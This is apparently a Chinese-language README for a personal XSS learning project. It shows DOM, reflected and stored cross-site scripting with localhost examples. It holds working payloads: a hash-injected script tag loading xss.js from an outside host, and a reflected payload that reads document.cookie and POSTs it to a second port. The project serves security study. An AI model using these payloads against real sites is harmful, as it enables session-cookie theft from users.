# xss_learn
xss学习

### dom 型

> dom 型由浏览器执行，与后端无关，需要前端规避。

访问 `domTest.html`，加上 hash 值：
```
// 可以通过本地 http-server 启动一个服务
http://127.0.0.1:8080/domTest.html#document.write("<script/src=//askybig.github.io/ImageStore/xss.js></script>")
```

### 反射型

> 反射型属于后端控制，对输入负责。

分别启动 3000 和 3001端口，在 3000页面输入url：
```
测试数据</h><script>(function () {var str = document.cookie;console.log('str', str);var request=new XMLHttpRequest();request.onreadystatechange=function(){if(request.readyState===4){if(request.status===200){console.log("success");return request}else{console.log("fail");return request}}else{}};request.open("POST","http://localhost:3001/xssattack");request.send(str);})()</script>
```
可以看到3000 端口的 Cookie 被 3001 拿到了。

![反射型](https://askybig.github.io/ImageStore/反射型.gif)

### 存储型

> 存储型也属于后端控制，对输入负责。

如果没有做过滤，比如将数据库存储的某条评论 `<script>alert(1)</script>` 拼接在评论列表的 HTML 上，用户访问就会造成存储型 xss 攻击。
